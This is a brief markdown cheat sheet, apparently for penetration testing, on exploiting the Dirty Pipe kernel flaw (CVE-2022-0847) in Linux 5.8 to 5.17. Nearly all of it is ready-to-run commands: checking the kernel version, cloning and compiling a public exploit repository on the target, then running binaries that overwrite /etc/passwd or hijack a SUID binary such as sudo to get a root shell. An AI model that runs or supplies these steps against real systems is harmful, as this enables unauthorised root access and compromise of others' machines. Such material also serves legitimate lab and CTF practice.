## Verify

Affected version: from `5.8` to `5.17`

```sh
uname -r
```

### Compile

Compile on target machine, saves you the headache

```sh
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

There will be 2 binary, the `exploit-1` edit `/etc/passwd` to let us log in as `root`, the `exploit-2` executes a `SUID` binary of choice, like `sudo` and pop us a shell

```sh
./exploit-1
./exploit-2 /usr/bin/sudo
```
